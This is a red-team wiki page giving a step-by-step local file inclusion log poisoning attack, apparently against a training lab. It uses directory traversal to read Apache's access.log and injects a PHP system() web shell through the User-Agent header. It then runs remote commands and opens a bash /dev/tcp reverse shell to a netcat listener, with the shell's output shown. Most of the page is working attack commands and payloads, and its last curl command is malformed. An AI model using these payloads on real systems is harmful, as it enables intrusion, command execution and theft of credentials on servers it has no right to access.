---
title: LFI  Log Poisoning
parent: Attack Repository
grand_parent: Red Team
nav_order: 8
---
# Log Poisoning
##### Writing code to /var/log/apache2/access.log
1. Use curl to exploit the discovered directory traversal vulnerability and display the access.log file
```bash
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
```

```
# Output
...
192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] “GET /meteor/index.php?page=admin.php HTTP/1.1” 200 2218 “-” "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
...
```
This indicates that the log entry contains the user agent.

*Using Burp from here on*

2. Before sending the request, change the user agent in Burp and specify the content to be written to the access.log file.
```bash
User-Agent: Mozilla/5.0 <?php echo system($_GET[‘cmd’]); ?>
```

![[../../Assets/images/Pasted image 20260506003910.png]]

3. Send
- The PHP code in the User-Agent header is written to the access.log
- From this point on, you can execute commands on the target system, allowing you to retrieve credentials, establish a reverse shell, and add SSH keys to the user’s authorized_keys file

4. Information Retrieval
```bash
# Rewrite the GET request in Burp Repeater as follows and send it
# cmd=id
GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=id HTTP/1.1

# cmd=dir
GET /meteor/index.php?page=../../../../../xampp/apache/logs/access.log&cmd=dir HTTP/1.1

# cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt
GET /meteor/index.php?page=../../../../../xampp/apache/logs/access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt HTTP/1.1
```
![[../../Assets/images/Pasted image 20260506003947.png]]
5. Reverse Shell
Listening with nc
```bash
nc -nlvp 4444
```
Encode the following
```bash
bash -c “bash -i >& /dev/tcp/192.168.119.3/4444 0>&1”
⏬ URL-encode
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```
Send
```bash
curl http://192.168.121.96/meteor/index.php?page=../../../../../../../ var/log/apache2/access.log/?cmd=bash -c "bash -i %3E %26 %20%2Fdev%2Ftcp%2F192.168.119.3%2F4444 %200 %3E %261%22
```
Result
```bash
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.3] from (UNKNOWN) [192.168.50.16] 57848
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
```
![[../../Assets/images/Pasted image 20260506004044.png]]
